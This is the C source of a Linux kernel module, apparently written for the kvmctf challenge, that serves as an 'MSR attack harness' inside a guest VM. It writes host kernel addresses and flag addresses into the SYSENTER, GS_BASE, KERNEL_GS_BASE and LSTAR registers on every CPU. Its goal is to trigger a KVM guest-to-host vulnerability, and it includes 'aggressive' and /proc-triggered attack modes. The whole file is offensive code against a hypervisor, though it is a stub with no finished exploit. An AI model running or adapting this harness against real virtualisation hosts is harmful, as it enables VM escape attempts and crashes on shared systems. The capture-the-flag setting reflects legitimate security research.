// kvmctf_msr_attack.c - MSR-based KVM poke harness for kvmctf
//
// This is designed to run inside the L1 guest kernel.
// It:
//   - logs that it's active,
//   - writes selected MSRs with host-derived addresses,
//   - exposes a simple /proc interface you can poke later if needed.
//
// It does NOT hard-code a particular exploit; it's your “delivery stub”
// for hitting the kvmctf bug once you see how L0 reacts.

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/smp.h>
#include <asm/msr.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kvmctf prep");
MODULE_DESCRIPTION("L1 MSR attack harness for kvmctf");

// ==== Host-side addresses from your recon (adjust for CTF host) ====

static u64 host_rip      = 0xffffffffc086cb50ULL;
static u64 host_rsp      = 0xffffbedc0df9bc98ULL;
static u64 host_gs_base  = 0xffff9a58b1000000ULL;
static u64 host_kernel   = 0xffffffff8c000000ULL;

// kvmctf flag addresses provided in the challenge:
static u64 write_flag_va = 0xffffffff826279a8ULL;
static u64 read_flag_va  = 0xffffffff82b5ee10ULL;

// ==== MSRs of interest ====
#define MSR_IA32_SYSENTER_CS    0x174
#define MSR_IA32_SYSENTER_ESP   0x175
#define MSR_IA32_SYSENTER_EIP   0x176
#define MSR_EFER                0xC0000080
#define MSR_STAR                0xC0000081
#define MSR_LSTAR               0xC0000082
#define MSR_CSTAR               0xC0000083
#define MSR_SYSCALL_MASK        0xC0000084
#define MSR_FS_BASE             0xC0000100
#define MSR_GS_BASE             0xC0000101
#define MSR_KERNEL_GS_BASE      0xC0000102

struct msr_saved {
	u64 sysenter_cs;
	u64 sysenter_esp;
	u64 sysenter_eip;
	u64 fs_base;
	u64 gs_base;
	u64 kernel_gs_base;
	u64 lstar;
};

static struct msr_saved per_cpu_saved[NR_CPUS];

static void msr_attack_on_cpu(void *info)
{
	int cpu = smp_processor_id();
	struct msr_saved *s = &per_cpu_saved[cpu];
	u64 val;

	pr_info("[kvmctf_msr] CPU %d: starting MSR attack\n", cpu);

	// Save current values
	rdmsrl(MSR_IA32_SYSENTER_CS, s->sysenter_cs);
	rdmsrl(MSR_IA32_SYSENTER_ESP, s->sysenter_esp);
	rdmsrl(MSR_IA32_SYSENTER_EIP, s->sysenter_eip);
	rdmsrl(MSR_FS_BASE, s->fs_base);
	rdmsrl(MSR_GS_BASE, s->gs_base);
	rdmsrl(MSR_KERNEL_GS_BASE, s->kernel_gs_base);
	rdmsrl(MSR_LSTAR, s->lstar);

	// Basic logging
	pr_info("[kvmctf_msr] CPU %d saved:\n", cpu);
	pr_info("  SYSENTER_CS  = 0x%016llx\n", s->sysenter_cs);
	pr_info("  SYSENTER_ESP = 0x%016llx\n", s->sysenter_esp);
	pr_info("  SYSENTER_EIP = 0x%016llx\n", s->sysenter_eip);
	pr_info("  FS_BASE      = 0x%016llx\n", s->fs_base);
	pr_info("  GS_BASE      = 0x%016llx\n", s->gs_base);
	pr_info("  KERNEL_GS    = 0x%016llx\n", s->kernel_gs_base);
	pr_info("  LSTAR        = 0x%016llx\n", s->lstar);

	// === Phase 1: point MSRs at host-known addresses ===

	// Try to set SYSENTER_ESP to host RSP (masked to trigger any sign-extension bug)
	// Only modify one critical MSR at a time to prevent system freeze
	val = host_rsp & 0x0000FFFFFFFFFFFFULL;
	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_ESP to 0x%016llx\n",
		cpu, val);
	wrmsrl(MSR_IA32_SYSENTER_ESP, val);

	// Try to set SYSENTER_EIP to host RIP (or gadget area)
	val = host_rip & 0x0000FFFFFFFFFFFFULL;
	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_EIP to 0x%016llx\n",
		cpu, val);
	wrmsrl(MSR_IA32_SYSENTER_EIP, val);

	// For other MSRs, we'll be more conservative - only set one for initial test
	// Try GS_BASE pointing at flag region to start with
	pr_info("[kvmctf_msr] CPU %d: setting GS_BASE to write_flag_va=0x%016llx\n",
		cpu, write_flag_va);
	wrmsrl(MSR_GS_BASE, write_flag_va);

	pr_info("[kvmctf_msr] CPU %d: MSR attack done (no restore yet)\n", cpu);
}

// Aggressive version that sets more MSRs to trigger the vulnerability
static void msr_aggressive_attack_on_cpu(void *info)
{
	int cpu = smp_processor_id();
	struct msr_saved *s = &per_cpu_saved[cpu];
	u64 val;

	pr_info("[kvmctf_msr] CPU %d: starting AGGRESSIVE MSR attack\n", cpu);

	// Save current values if not already saved
	rdmsrl(MSR_IA32_SYSENTER_CS, s->sysenter_cs);
	rdmsrl(MSR_IA32_SYSENTER_ESP, s->sysenter_esp);
	rdmsrl(MSR_IA32_SYSENTER_EIP, s->sysenter_eip);
	rdmsrl(MSR_FS_BASE, s->fs_base);
	rdmsrl(MSR_GS_BASE, s->gs_base);
	rdmsrl(MSR_KERNEL_GS_BASE, s->kernel_gs_base);
	rdmsrl(MSR_LSTAR, s->lstar);

	// Try to set SYSENTER_ESP to host RSP (masked to trigger any sign-extension bug)
	val = host_rsp & 0x0000FFFFFFFFFFFFULL;
	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_ESP to 0x%016llx\n",
		cpu, val);
	wrmsrl(MSR_IA32_SYSENTER_ESP, val);

	// Try to set SYSENTER_EIP to host RIP (or gadget area)
	val = host_rip & 0x0000FFFFFFFFFFFFULL;
	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_EIP to 0x%016llx\n",
		cpu, val);
	wrmsrl(MSR_IA32_SYSENTER_EIP, val);

	// Now set multiple MSRs to increase chances of triggering the vulnerability
	pr_info("[kvmctf_msr] CPU %d: setting FS_BASE to host_gs_base=0x%016llx\n",
		cpu, host_gs_base);
	wrmsrl(MSR_FS_BASE, host_gs_base);

	pr_info("[kvmctf_msr] CPU %d: setting GS_BASE to write_flag_va=0x%016llx\n",
		cpu, write_flag_va);
	wrmsrl(MSR_GS_BASE, write_flag_va);

	pr_info("[kvmctf_msr] CPU %d: setting KERNEL_GS_BASE to read_flag_va=0x%016llx\n",
		cpu, read_flag_va);
	wrmsrl(MSR_KERNEL_GS_BASE, read_flag_va);

	// Try LSTAR pointing into host kernel text
	pr_info("[kvmctf_msr] CPU %d: setting LSTAR to host_kernel+0x1000=0x%016llx\n",
		cpu, host_kernel + 0x1000);
	wrmsrl(MSR_LSTAR, host_kernel + 0x1000);

	pr_info("[kvmctf_msr] CPU %d: AGGRESSIVE MSR attack done\n", cpu);
}

// Optional: restore original MSR state if you unload the module
static void msr_restore_on_cpu(void *info)
{
	int cpu = smp_processor_id();
	struct msr_saved *s = &per_cpu_saved[cpu];

	pr_info("[kvmctf_msr] CPU %d: restoring original MSRs\n", cpu);

	wrmsrl(MSR_IA32_SYSENTER_CS,  s->sysenter_cs);
	wrmsrl(MSR_IA32_SYSENTER_ESP, s->sysenter_esp);
	wrmsrl(MSR_IA32_SYSENTER_EIP, s->sysenter_eip);
	wrmsrl(MSR_FS_BASE,           s->fs_base);
	wrmsrl(MSR_GS_BASE,           s->gs_base);
	wrmsrl(MSR_KERNEL_GS_BASE,    s->kernel_gs_base);
	wrmsrl(MSR_LSTAR,             s->lstar);
}

// ==== Simple procfs hook so you can re-trigger or tweak in CTF ====

#define PROC_NAME "kvmctf_msr_attack"

static ssize_t proc_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
	char kbuf[64];

	if (count > sizeof(kbuf) - 1)
		count = sizeof(kbuf) - 1;
	if (copy_from_user(kbuf, buf, count))
		return -EFAULT;
	kbuf[count] = '\0';

	if (strncmp(kbuf, "attack", 6) == 0) {
		on_each_cpu(msr_attack_on_cpu, NULL, 1);
		pr_info("[kvmctf_msr] attack retriggered via /proc\n");
	} else if (strncmp(kbuf, "restore", 7) == 0) {
		on_each_cpu(msr_restore_on_cpu, NULL, 1);
		pr_info("[kvmctf_msr] restore triggered via /proc\n");
	} else if (strncmp(kbuf, "aggressive", 8) == 0) {
		// Aggressive mode - set more MSRs to try to trigger the vulnerability
		on_each_cpu(msr_aggressive_attack_on_cpu, NULL, 1);
		pr_info("[kvmctf_msr] aggressive attack triggered via /proc\n");
	} else {
		pr_info("[kvmctf_msr] unknown command in /proc: %s\n", kbuf);
	}

	return count;
}

static const struct proc_ops proc_fops = {
	.proc_write = proc_write,
};

static int __init kvmctf_msr_init(void)
{
	if (!proc_create(PROC_NAME, 0222, NULL, &proc_fops)) {
		pr_err("[kvmctf_msr] failed to create /proc/%s\n", PROC_NAME);
		return -ENOMEM;
	}

	pr_info("[kvmctf_msr] loaded\n");
	pr_info("[kvmctf_msr] host_rip=0x%016llx host_rsp=0x%016llx host_gs=0x%016llx\n",
		host_rip, host_rsp, host_gs_base);
	pr_info("[kvmctf_msr] write_flag_va=0x%016llx read_flag_va=0x%016llx\n",
		write_flag_va, read_flag_va);

	// Initial attack run
	on_each_cpu(msr_attack_on_cpu, NULL, 1);

	return 0;
}

static void __exit kvmctf_msr_exit(void)
{
	remove_proc_entry(PROC_NAME, NULL);

	// Optional: restore MSRs on unload
	on_each_cpu(msr_restore_on_cpu, NULL, 1);
	pr_info("[kvmctf_msr] unloaded\n");
}

module_init(kvmctf_msr_init);
module_exit(kvmctf_msr_exit);
